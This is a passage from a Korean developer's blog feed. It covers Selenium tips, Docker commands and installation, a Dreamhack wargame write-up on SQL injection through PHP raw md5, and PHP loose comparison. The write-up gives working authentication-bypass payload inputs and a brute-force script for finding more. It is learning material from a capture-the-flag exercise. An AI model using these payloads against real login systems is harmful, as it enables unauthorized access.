<span class="n">pwd</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="sh">'</span><span class="s">login_pwd</span><span class="sh">'</span><span class="p">)</span>

<span class="nb">id</span><span class="p">.</span><span class="nf">send_keys</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pwd</span><span class="p">.</span><span class="nf">send_keys</span><span class="p">(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-프로그램-끝나도-자동-종료-안되게-하기">Selenium 프로그램 끝나도 자동 종료 안되게 하기</h2>

<ul>
  <li>단 selenium 을 실행시킨 터미널을 끄면 selenium 브라우저도 같이 종료되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">options</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">EdgeOptions</span><span class="p">()</span>
<span class="n">options</span><span class="p">.</span><span class="nf">add_experimental_option</span><span class="p">(</span><span class="sh">"</span><span class="s">detach</span><span class="sh">"</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Edge</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-alert-창-제어하기">Selenium Alert 창 제어하기</h2>

<ul>
  <li>Alert 창이 떴을 때 제어하지 않고 작업을 진행하면 UnexpectedAlertPresentException 오류가 발생한다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
	<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">xxx</span><span class="sh">'</span><span class="p">)</span>
<span class="k">except</span> <span class="n">UnexpectedAlertPresentException</span><span class="p">:</span>
	<span class="c1"># 자동으로 alert 창이 닫긴다.
</span>	<span class="k">pass</span>

<span class="n">또는</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">xxx</span><span class="sh">'</span><span class="p">)</span>
		<span class="k">break</span>
	<span class="k">except</span> <span class="n">UnexpectedAlertPresentException</span><span class="p">:</span>
		<span class="c1"># 자동으로 alert 창이 닫긴다.
</span>		<span class="k">pass</span>
</code></pre></div></div>

<h2 id="selenium-element-소스-코드-확인하기">Selenium element 소스 코드 확인하기</h2>

<ul>
  <li>element 의 소스 코드를 쉽게 확인해볼 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ele</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="sh">'</span><span class="s">아이디</span><span class="sh">'</span><span class="p">)</span>
<span class="n">ele</span><span class="p">.</span><span class="nf">get_attribute</span><span class="p">(</span><span class="sh">'</span><span class="s">outerHTML</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-브라우저-크기-설정">Selenium 브라우저 크기 설정</h2>

<ul>
  <li>첫 브라우저를 열기전에 사용하면 된다. 브라우저가 열리고 나서는 크기를 조절할 수 없다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Edge</span><span class="p">()</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">set_window_size</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span><span class="mi">800</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-새창-열기-새로운-탭-열기">Selenium 새창 열기 (새로운 탭 열기)</h2>

<ul>
  <li>자바 스크립트 코드를 이용하여 새로운 창을 열 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 처음 URL 열기.
</span><span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="c1"># 새로운 창 만들기.
</span><span class="n">driver</span><span class="p">.</span><span class="nf">execute_script</span><span class="p">(</span><span class="sh">"</span><span class="s">window.open(</span><span class="sh">''</span><span class="s">);</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># 새로운 창으로 전환 및 새로운 URL 로 이동
</span><span class="n">driver</span><span class="p">.</span><span class="n">switch_to</span><span class="p">.</span><span class="nf">window</span><span class="p">(</span><span class="n">driver</span><span class="p">.</span><span class="n">window_handles</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>

<ul>
  <li><a href="https://stackoverflow.com/questions/70886308/webdriver-call-with-executable-path-deprecated">python - Webdriver call with executable path deprecated - Stack Overflow</a></li>
  <li><a href="https://github.com/SeleniumHQ/seleniumhq.github.io/blob/trunk//examples/python/tests/browsers/test_edge.py#L54">seleniumhq.github.io/examples/python/tests/browsers/test_edge.py at trunk · SeleniumHQ/seleniumhq.github.io</a></li>
  <li><a href="https://yukifox.tistory.com/entry/selenium%EC%97%90%EC%84%9C-Alert-%EC%A0%9C%EC%96%B4-%EB%B0%A9%EB%B2%95">저장소 :: selenium에서 Alert 제어 방법 (tistory.com)</a></li>
  <li><a href="https://www.browserstack.com/guide/get-html-source-of-web-element-in-selenium-webdriver">How to get HTML source of a Web Element in Selenium WebDriver BrowserStack</a></li>
  <li><a href="https://stackoverflow.com/questions/15397483/how-to-set-browsers-width-and-height-in-selenium-webdriver">python - How to set browser’s width and height in Selenium WebDriver? - Stack Overflow</a></li>
  <li><a href="https://www.geeksforgeeks.org/opening-and-closing-tabs-using-selenium/">Opening and Closing Tabs Using Selenium - GeeksforGeeks</a></li>
  <li><a href="https://couplewith.tistory.com/448">python Selenium - 웹페이지 Alert창 종류와 관리 (tistory.com)</a></li>
  <li><a href="https://dejavuqa.tistory.com/109">find_element By로 정리하기 (tistory.com)</a></li>
  <li><a href="https://ssamko.tistory.com/9">Selenium 으로 간단한 매크로 만들기 python (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="기술" /><category term="selenium" /><category term="python" /><summary type="html"><![CDATA[Selenium 사용할 때 유용한 정보를 정리해 보았다.]]></summary></entry><entry><title type="html">Docker 명령어 정리</title><link href="http://localhost:4000/ubuntu/docker%EB%AA%85%EB%A0%B9%EC%96%B4/" rel="alternate" type="text/html" title="Docker 명령어 정리" /><published>2023-10-06T00:00:00+00:00</published><updated>2023-10-06T14:13:00+00:00</updated><id>http://localhost:4000/ubuntu/docker%EB%AA%85%EB%A0%B9%EC%96%B4</id><content type="html" xml:base="http://localhost:4000/ubuntu/docker%EB%AA%85%EB%A0%B9%EC%96%B4/"><![CDATA[<h2 id="run">RUN</h2>
<ul>
  <li>컨테이너를 만드는 동시에 실행시킨다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run [옵션 들] [이미지 id 또는 이름] [CMD 실행할 명령어]
</code></pre></div></div>
<h3 id="옵션">옵션</h3>

<h4 id="-it"><code class="language-plaintext highlighter-rouge">-it</code></h4>
<ul>
  <li>컨테이너를 종류 안하고 명령어를 실행시킨다.</li>
  <li>계속 명령어를 입력할 수 있는 상태가 된다.</li>
  <li><code class="language-plaintext highlighter-rouge">/bin/bash</code>, <code class="language-plaintext highlighter-rouge">python</code> 등 과 같이 이용할 수 있다.</li>
  <li>
    <p>exit 명령을 써서 container 을 나가면 container 는 그대로 종료된다.</p>
  </li>
  <li>예</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -it [이미지 id] /bin/bash
</code></pre></div></div>

<ul>
  <li>컨테이너를 종료하지 않고 빠져나올 때.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctrl+p+q
</code></pre></div></div>

<h4 id="-d"><code class="language-plaintext highlighter-rouge">-d</code></h4>
<ul>
  <li>백 그라운드에서 앱을 실행시켜 준다</li>
</ul>

<h4 id="--rm"><code class="language-plaintext highlighter-rouge">--rm</code></h4>
<ul>
  <li>컨테이너가 종료되면 그대로 컨테이너를 삭제한다.</li>
</ul>

<h4 id="--name"><code class="language-plaintext highlighter-rouge">--name</code></h4>
<ul>
  <li>컨테이너에 이름을 부여해준다.</li>
  <li>이름으로 컨테이너를 크고, 끄고, 삭제할 수 있다.</li>
</ul>

<h4 id="-e"><code class="language-plaintext highlighter-rouge">-e</code></h4>
<ul>
  <li>컨테이너의 환경변수를 설정할 수 있다.</li>
</ul>

<h4 id="-p"><code class="language-plaintext highlighter-rouge">-p</code></h4>
<ul>
  <li>호스트와 컨테이너 간의 포트를 바인딩 해준다.</li>
  <li>포트포워딩이라 생각하면 편함</li>
</ul>

<h4 id="-v"><code class="language-plaintext highlighter-rouge">-v</code></h4>
<ul>
  <li>호스트와 컨테이너 간의 볼륨을 마운팅 하기 위해 사용된다.</li>
  <li>즉 호스트 컴퓨터의 특정 폴더를 컨테이터의 특정 폴더로 마운팅할 수 있다.</li>
</ul>

<h4 id="-w"><code class="language-plaintext highlighter-rouge">-w</code></h4>
<ul>
  <li>컨테이너의 작업 디렉터리를 설정해 줄 수 있다. 즉 기복 작업 폴더를 설정할 때 쓰인다.</li>
  <li>
    <p>Dockerfile 에서 설정한 <code class="language-plaintext highlighter-rouge">WORKDIR</code> 값을 덮어 씌을 수 있다.</p>
  </li>
  <li>기본 시작 폴더가 etc 인 것을 확인할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -it --rm -w /etc ubuntu:23.10 /bin/bash
</code></pre></div></div>

<h4 id="--entrypoint"><code class="language-plaintext highlighter-rouge">--entrypoint</code></h4>
<ul>
  <li>entrypoint 값을 설정한다.</li>
  <li>Dockerfile 에서 설정한 <code class="language-plaintext highlighter-rouge">ENTRYPOINT</code> 값을 덮어씌을 수 있다.</li>
  <li>컨테이너가 생성되고 처음 실행되는 명령어를 설정할 수 있다.</li>
  <li>
    <p>주로 메인 명령어를 entrypoint 로 설정하고 cmd 로 옵션 값을 전달해 준다.</p>
  </li>
  <li>메인 명령어 <code class="language-plaintext highlighter-rouge">df</code> , 옵션 <code class="language-plaintext highlighter-rouge">-h</code></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --rm --entrypoint df ubuntu:23.10 -h
</code></pre></div></div>

<h2 id="attach">ATTACH</h2>
<ul>
  <li>실행중인 container 에 바로 접속할 수 있다.</li>
  <li>주로 COMMAND 가 <code class="language-plaintext highlighter-rouge">/bin/bash</code> 일 때 사용한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker attach [실행중인 컨테이너 ID]
</code></pre></div></div>

<h2 id="exec">EXEC</h2>
<ul>
  <li>디버깅 하거나 단일 명령어 또는 커맨드 창에 접속하고 싶을 때 사용한다.</li>
  <li>외부에서 컨테이너에 접속할 때 사용한다.</li>
  <li>단일 명령어 사용이 가능하다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker exec [실행중인 컨테이너 ID]
</code></pre></div></div>

<h3 id="옵션-1">옵션</h3>

<h4 id="-it-1"><code class="language-plaintext highlighter-rouge">-it</code></h4>
<ul>
  <li>컨테이너를 종류 안하고 명령어를 실행시킨다.</li>
  <li>
    <p>exit 명령을 써서 container 을 나가도 종료가 container 종료가 되지 않는다.</p>
  </li>
  <li>예</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker exec -it [실행중인 컨테이너 ID] /bin/bash
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://changminzzang.tistory.com/17">Docker 4. exec 와 attach 명령어 차이 (tistory.com)</a></li>
  <li><a href="https://bluese05.tistory.com/77">Dockerfile Entrypoint 와 CMD의 올바른 사용 방법 (tistory.com)</a></li>
  <li><a href="https://www.daleseo.com/docker-run/">docker run 커맨드 사용법 Engineering Blog by Dale Seo</a></li>
  <li><a href="https://wooono.tistory.com/123">Docker Dockerfile 개념 및 작성법 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Ubuntu" /><category term="docker" /><summary type="html"><![CDATA[Docker 명령어 정리를 해보았다.]]></summary></entry><entry><title type="html">Docker 설치하기</title><link href="http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98/" rel="alternate" type="text/html" title="Docker 설치하기" /><published>2023-10-02T00:00:00+00:00</published><updated>2023-10-02T14:13:00+00:00</updated><id>http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98</id><content type="html" xml:base="http://localhost:4000/ubuntu/docker%EC%84%A4%EC%B9%98/"><![CDATA[<h2 id="설치된-docker-버전-삭제하기">설치된 Docker 버전 삭제하기</h2>

<ul>
  <li>Docker engine 을 설치하기 전, 설치된 docker 패키지들을 삭제하여야 한다.</li>
  <li>비공식 패키지들 삭제하여야 한다.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">docker.io</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-compose</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-doc</code></li>
      <li><code class="language-plaintext highlighter-rouge">podman-docker</code></li>
    </ul>
  </li>
  <li>Docker Engine 의 의존성인 <code class="language-plaintext highlighter-rouge">containerd.io</code> 와의 충돌을 피하기 위해서  <code class="language-plaintext highlighter-rouge">containerd</code>, <code class="language-plaintext highlighter-rouge">runc</code> 역시 삭제하여야 한다.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">for pkg in docker.io docker-doc docker-compose podman-docker containerd runc;</span><span class="w"> </span><span class="k">do </span><span class="nb">sudo </span>apt-get remove <span class="nv">$pkg</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<h2 id="패키지를-이용하여-docker-설치하기">패키지를 이용하여 docker 설치하기</h2>

<ul>
  <li>apt 를 이용하여 docker 을 설치하는 것이 아닌 <code class="language-plaintext highlighter-rouge">dpkg</code> 를 사용하여 docker을 설치하는 방법을 정리하였다.</li>
  <li><code class="language-plaintext highlighter-rouge">deb</code> 파일을 다운로드 받고 설치해주면 된다. 그리고 만약 업그레이를 원한다면 새로운 파일을 다운로드 받고 설치해주면 된다. ( 삭제할 필요는 없다. )</li>
</ul>

<ol>
  <li><a href="https://download.docker.com/linux/ubuntu/dists/">Index of linux/ubuntu/dists/ (docker.com)</a> 링크로 들어간다.</li>
  <li>ubuntu 버전을 선택한다. ( 특정 버전 폴더로 이동하기 )</li>
  <li><code class="language-plaintext highlighter-rouge">pool/stable</code> 로 이동하고 현재 아키텍처를 선택한다. ( <code class="language-plaintext highlighter-rouge">amd64</code>, <code class="language-plaintext highlighter-rouge">armhf</code>, <code class="language-plaintext highlighter-rouge">arm64</code>, <code class="language-plaintext highlighter-rouge">s390x</code> )</li>
  <li>
    <p>Docker Engine 그리고 CLI, containerd, Docker Compose packages deb 파일들 다운로드를 한다.</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">containerd.io_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-ce_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-ce-cli_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-buildx-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
      <li><code class="language-plaintext highlighter-rouge">docker-compose-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">.deb</code> 패키지 설치하기.</li>
</ol>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sudo dpkg -i ./containerd.io_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-ce_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-ce-cli_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-buildx-plugin_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb <span class="se">\</span>
<span class="gp">  ./docker-compose-plugin_&lt;version&gt;</span>_&lt;<span class="nb">arch</span><span class="o">&gt;</span>.deb
</code></pre></div></div>

<ul>
  <li>Docker Engine 이 성공적으로 설치되어 있는지 확인하기.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sudo service docker start
sudo docker run hello-world
</span></code></pre></div></div>

<h3 id="docker-engine-업그레이드">Docker Engine 업그레이드</h3>
<ul>
  <li>업그레이드 버전의 package 파일들을 다운로드하고 위의 과정을 반복해주면 된다.</li>
</ul>

<h2 id="우분투-architecture-확인법">우분투 Architecture 확인법</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">dpkg -s libc6 | grep Arch
</span></code></pre></div></div>

<h2 id="우분투-버전-확인법">우분투 버전 확인법</h2>
<ul>
  <li>VERSION_CODENAME 을 확인해주면 된다.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">cat /etc/os-release
</span></code></pre></div></div>

<h2 id="wsl2-에서-docker-start-가-안될-때">WSL2 에서 Docker Start 가 안될 때</h2>

<ol>
  <li><code class="language-plaintext highlighter-rouge">sudo update-alternatives --config iptables</code></li>
  <li>“1” 번을 입력하고 엔터를 누른다. ( 즉, iptables-legacy 선택 )</li>
  <li><code class="language-plaintext highlighter-rouge">sudo service docker start</code></li>
</ol>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://docs.docker.com/engine/install/raspberry-pi-os/#install-from-a-package">Install Docker Engine on Raspberry Pi OS Docker Docs</a></li>
  <li><a href="https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/">Index of linux/ubuntu/dists/jammy/pool/stable/amd64/ (docker.com)</a></li>
  <li><a href="https://main.tistory.com/26">Ubuntu Architecture 확인 방법 (tistory.com)</a></li>
  <li><a href="https://askubuntu.com/questions/1437128/docker-service-wont-start-on-ubuntu-22-04-on-wsl2">Docker service won’t start on Ubuntu 22.04 on WSL2 - Ask Ubuntu</a></li>
  <li><a href="https://askubuntu.com/questions/1437128/docker-service-wont-start-on-ubuntu-22-04-on-wsl2">Docker service won’t start on Ubuntu 22.04 on WSL2 - Ask Ubuntu</a></li>
  <li><a href="https://www.lainyzine.com/ko/article/how-to-start-shutdown-reboot-wsl-linux/">WSL 리눅스 시작/종료/재부팅 방법 (lainyzine.com)</a></li>
  <li><a href="https://seong6496.tistory.com/316">우분투 버전 간단한 확인방법 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Ubuntu" /><category term="docker" /><summary type="html"><![CDATA[Docker 패키지를 이용하여 설치하여 보자.]]></summary></entry><entry><title type="html">PHP md5 (SQL Injection)</title><link href="http://localhost:4000/dreamhack/SQLiPHPmd5/" rel="alternate" type="text/html" title="PHP md5 (SQL Injection)" /><published>2023-09-12T00:00:00+00:00</published><updated>2023-09-12T14:13:00+00:00</updated><id>http://localhost:4000/dreamhack/SQLiPHPmd5</id><content type="html" xml:base="http://localhost:4000/dreamhack/SQLiPHPmd5/"><![CDATA[<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/337">wargame.kr md5 password 워게임 Dreamhack</a></li>
</ul>

<h2 id="php-md5">PHP md5</h2>
<ul>
  <li>md5 해시화를 이용하여 sql injection 공격을 시도할 수 있다.</li>
</ul>

<h3 id="분석">분석</h3>
<ul>
  <li>php 의 md5 기능을 이용하여 사용자의 입력을 해시화 한다.</li>
  <li>해시화 한 값을 이용하여 password 와 비교한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span><span class="err"> </span><span class="o">*</span><span class="err"> </span><span class="k">from</span><span class="err"> </span><span class="n">admin_password</span><span class="err"> </span><span class="k">where</span><span class="err"> </span><span class="n">password</span><span class="o">=</span><span class="s1">'".md5($ps,true)."'</span>
</code></pre></div></div>

<ul>
  <li>md5(입력,true) : 16자리의 바이너리를 반환한다.</li>
  <li>md5(입력,flase) : 32 문자열 16진수를 반환한다.</li>
</ul>

<h3 id="공격">공격</h3>

<h4 id="방법-1--or">방법 1 : or</h4>
<ul>
  <li>or 을 이용하여 password 인증을 우회해보자.</li>
  <li>사용자의 입력을 md5 해시화를 진행하여 완성된 값에 <code class="language-plaintext highlighter-rouge">'or'</code> 이 존재하면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5(입력,true)= aaa'or'bbb

select * from admin_password where password='aaa'or'bbb'
</code></pre></div></div>

<ul>
  <li>
    <p>or 앞 부분이 False 여도 뒷 부분이 true 이기 때문에 비밀번호 인증 우회가 가능하다.</p>
  </li>
  <li>
    <p>sql injection 공격 payload.</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>129581926211651571912466741651878684928

md5 = �T0D��o#��'or'8
</code></pre></div></div>

<h4 id="방법-2--">방법 2 : =</h4>
<ul>
  <li>= 을 이용하여 password 인증을 우회해보자.</li>
  <li>사용자의 입력을 md5 해시화를 진행하여 완성된 값에 <code class="language-plaintext highlighter-rouge">'='문자</code> 이 존재하면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5(입력,true) = asdfaskd'='asdf

select * from admin_password where password='asdfaskd'='asdf'
</code></pre></div></div>

<ul>
  <li>원리</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>where password='asdfaskd'='asdf'

는 먼저 앞 부분을 비교한다.

where (password='asdfaskd')='asdf'

where false='asdf' 

여기서 mysql false 의 타입은 tinyint 이고 값은 0 이다.
'asdf' 타입을 SIGNED 즉 int 형으로 바꿔서 비교를 진행한다.

따라서 비교하는 값은 다음과 같다.

where 0=0
</code></pre></div></div>

<ul>
  <li>직접 확인하기.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">false</span><span class="o">=</span><span class="s1">'123'</span><span class="p">;</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">select</span> <span class="k">false</span><span class="o">=</span><span class="s1">'aaaa'</span><span class="p">;</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">1</span>
</code></pre></div></div>

<ul>
  <li>여기서 주의해야 할 점이 있는데 <code class="language-plaintext highlighter-rouge">'123adfsf'</code> 와 같은 형태를 int 형으로 타입 변환하면 123 으로 변환되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">cast</span><span class="p">(</span><span class="s1">'123asdf'</span> <span class="k">as</span> <span class="nb">SIGNED</span><span class="p">);</span>
<span class="err">출력</span> <span class="o">=</span> <span class="mi">123</span>
</code></pre></div></div>

<ul>
  <li>sql injection 공격 payload.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>98750788
md5 = n�A�nI�^���h'='

하지만 다음 값은 실패한다.
38106544
md5 = &amp;�p'='63@-��

왜냐하면
1. select * from admin_password where password='&amp;�p'='63@-��'
2. select * from admin_password where false='63@-��'
3. select * from admin_password where false=63
4. select * from admin_password where 0=63

0과 63을 비교하는 형태가 되기 때문이다.
</code></pre></div></div>

<h3 id="평문-값-찾기">평문 값 찾기</h3>
<ul>
  <li>python 을 이용하여 <code class="language-plaintext highlighter-rouge">'='</code> 값이 들어가는 평문 값을 쉽게 찾아줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>

<span class="n">key1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"'</span><span class="s">=</span><span class="sh">'"</span>
<span class="n">key2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"'</span><span class="s">or</span><span class="sh">'"</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100_000_000</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="nf">md5</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">digest</span><span class="p">()</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="n">key1</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">key1</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">elif</span> <span class="n">key2</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">key2</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://heavening.tistory.com/85">int의 종류 및 크기 tinyint, smallint, int, bigint 초간단 정리 (tistory.com)</a></li>
  <li><a href="https://www.php.net/manual/en/function.md5.php">PHP: md5 - Manual</a></li>
  <li><a href="https://onecompiler.com/mysql">mysql 온라인 컴파일러</a></li>
  <li><a href="https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">SQL injection with raw MD5 hashes (Leet More CTF 2010 injection 300) - Christian von Kleist (posthaven.com)</a></li>
  <li><a href="https://github.com/seunghunoh57/SQL-Injection">seunghunoh57/SQL-Injection: This program will generate a password that bypasses a PHP script using raw md5 encryption for its password. (github.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="md5" /><category term="sqli" /><summary type="html"><![CDATA[php 의 md5 기능을 우회하여 sql injection 공격을 시도해보자.]]></summary></entry><entry><title type="html">PHP 비교연산자</title><link href="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/" rel="alternate" type="text/html" title="PHP 비교연산자" /><published>2023-09-11T00:00:00+00:00</published><updated>2023-09-11T14:13:00+00:00</updated><id>http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90</id><content type="html" xml:base="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/"><![CDATA[<ul>
  <li>php 에 존재하는 취약점이다!</li>
</ul>

<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/338">jff3_magic 워게임 Dreamhack</a></li>
</ul>

<h2 id="php-비교-연산자">PHP 비교 연산자</h2>
<ul>
  <li><code class="language-plaintext highlighter-rouge">==</code> : 자료형에 상관없이 값만 비교한다.</li>
  <li><code class="language-plaintext highlighter-rouge">===</code> : 자료형 및 값을 비교한다.</li>
</ul>

<h3 id="취약점">취약점</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">==</code> 이용하여 값을 비교할 때 값 만을 비교하여 발생할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">'0e2'</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$a</span><span class="o">==</span><span class="s1">'0'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="n">e123</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="s1">'0'</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$a</span><span class="o">==</span><span class="s1">'0'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
